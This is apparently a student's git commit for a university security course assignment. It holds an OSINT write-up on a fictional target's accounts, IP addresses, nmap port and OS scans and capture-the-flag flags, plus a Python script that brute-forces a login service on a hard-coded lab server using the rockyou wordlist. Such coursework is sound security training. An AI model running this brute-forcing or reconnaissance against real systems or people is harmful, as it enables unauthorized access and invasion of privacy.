932fb8e3b452a3c8f2d78760fbd3c73c8f27af0d
kylefirst <kylefirst@gmail.com>
2019-02-22 21:22:09 -0500

    added hw 2

--- assignments/2_OSINT/writeup/README.md
+++ assignments/2_OSINT/writeup/README.md
@@ -1,18 +1,67 @@
 # Writeup 2 - OSINT
 
-Name: *PUT YOUR NAME HERE*
-Section: *PUT YOUR SECTION NUMBER HERE*
+Name: *Kyle Liu*
+Section: *0101*
 
 I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examniation.
 
-Digital acknowledgement: *PUT YOUR NAME HERE*
+Digital acknowledgement: *Kyle Liu*
 
 ## Assignment Writeup
 
 ### Part 1 (45 pts)
 
-*Please use this space to writeup your answers and solutions (and how you found them!) for part 1.*
+1. Elizabeth Moffet
+2. Banking CEO at 13/37 National Bank (http://1337bank.money)
+3. See table below
+
+|Type|Username/Link| Discovery Method |
+|---|---|---|
+|Pastebin (v0idcache/fl1nch Chat Logs)|https://pastebin.com/WghDuAr7|Google Search
+| Github (no public activity) | https://github.com/v0idcache | Github search by user
+| Twitter handle| [@v0idcache](https://twitter.com/v0idcache?lang=en) | Twitter Advanced Search
+| Activity with other Twitter users | [@CacheDev0id](https://twitter.com/CacheDev0id?lang=en) | Twitter Advanced Search 
+| Twitter following | [@umdcsec](https://twitter.com/umdcsec?lang=en) | Twitter Bio
+| Location | Netherlands | Twitter Bio |
+| Email | v0idcache@protonmail.com | About section of bank webpage |
+4. See table below
+
+| IP Address | Host/Location | Discovery Method |
+|---|---|---|
+| 142.93.136.81 | Digital Ocean/Canada| Reverse DNS lookup (dnsdumpster.com) 
+| 162.255.118.61/162.255.118.62 | Namecheap (Email)/United States | Reverse DNS lookup (dnsdumpster.com) 
+| 216.87.155.33 | Verisign Certificate (Namecheap)/United States | Reverse DNS lookup (dnsdumpster.com)
+5. See table below
+
+| Website Flags | Discovery Method |
+|---|---|
+| CMSC389R-{h1dd3n_1n_plain_5ight} | inspect element |
+| CMSC389R-{h1ding_fil3s_in_r0bots_L0L} | robots.txt |
+6. nmap scan of first 10000 ports
+
+```
+22/tcp   open     ssh
+25/tcp   filtered smtp
+80/tcp   open     http
+554/tcp  open     rtsp
+1337/tcp open     waste
+7070/tcp open     realserver
+```
+
+7. OS is most likely some version of linux accoring to nmap -O
+```
+Aggressive OS guesses: Linux 4.4 (91%), Linux 4.0 (87%), Linux 3.11 - 4.1 (87%), Cisco RV320 router (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 3.10 - 3.12 (86%), Dish Network Hopper media device (86%), Linux 3.16 (85%), Linux 2.6.32 - 3.0 (85%)
+```
+8. See table below
+
+| Bonus Flags | Discovery Method |
+|---|---|
+| CMSC389R-{h0w_2_iNt0_DNS_r3c0Rd5}| DNS Records |
+| CMSC389R-{brut3_f0rce_m4ster} | Brute forcing server |
+| CMSC389R-{YWX4H3d3Bz6dx9lG32Odv0JZh} | AB4300.txt file from pastebin in server|
 
 ### Part 2 (75 pts)
 
-*Please use this space to detail your approach and solutions for part 2. Don't forget to upload yourcompleted source code to this /writeup directory as well!*
+Working bruteforce program is called ```sol.py```
+
+I have a loop that sends all the passwords in the wordlist (rockyou.txt file in kali) one at a time for v0idcache's user account to the server on the open port until the response from the server told me the username/password combination is valid. I formatted the payload to send for the username and password using struct.pack() in a char[] string format and then sent to payload to the server using s.send().
---
+++ assignments/2_OSINT/writeup/sol.py
@@ -0,0 +1,92 @@
+"""
+    If you know the IP address of v0idcache's server and you
+    know the port number of the service you are trying to connect
+    to, you can use nc or telnet in your Linux terminal to interface
+    with the server. To do so, run:
+
+        $ nc <ip address here> <port here>
+
+    In the above the example, the $-sign represents the shell, nc is the command
+    you run to establish a connection with the server using an explicit IP address
+    and port number.
+
+    If you have the discovered the IP address and port number, you should discover
+    that there is a remote control service behind a certain port. You will know you
+    have discovered the correct port if you are greeted with a login prompt when you
+    nc to the server.
+
+    In this Python script, we are mimicking the same behavior of nc'ing to the remote
+    control service, however we do so in an automated fashion. This is because it is
+    beneficial to script the process of attempting multiple login attempts, hoping that
+    one of our guesses logs us (the attacker) into the Briong server.
+
+    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
+
+"""
+
+import socket
+import struct
+
+host = "142.93.136.81" # IP address here
+port = 1337 # Port here
+wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+
+def brute_force():
+    """
+        Sockets: https://docs.python.org/2/library/socket.html
+        How to use the socket s:
+
+            # Establish socket connection
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+
+            Reading:
+
+                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+                print(data)             # Prints data
+
+            Sending:
+
+                s.send("something to send\n")   # Send a newline \n at the end of your command
+
+        General idea:
+
+            Given that you know a potential username, use a wordlist and iterate
+            through each possible password and repeatedly attempt to login to
+            v0idcache's server.
+    """
+
+    username = "v0idcache"   # Hint: use OSINT
+    wl = open(wordlist, "r")
+
+    # iterate through each line in the wordlist as individual passwords
+    for password in wl:
+        # Establish socket connection
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+
+        # read in username prompt
+        response = s.recv(1024)
+        # send username
+        username_format = str(len(username) + 1) + "s"
+        username_payload = struct.pack(username_format, (username + "\n").encode("utf-8"))
+        s.send(username_payload)
+
+        # read in password prompt
+        response = s.recv(1024)
+        #s end password
+        password_format = str(len(password) + 1) + "s"
+        password_payload = struct.pack(password_format, (password + "\n").encode("utf-8"))
+        s.send(password_payload)
+
+        # read in login status response
+        response = s.recv(1024)
+        s.close
+        
+        if response.decode() != "Fail\n":
+            print(response.decode())
+            print("Password is: " + password) # linkinpark
+            exit()
+
+if __name__ == '__main__':
+    brute_force()
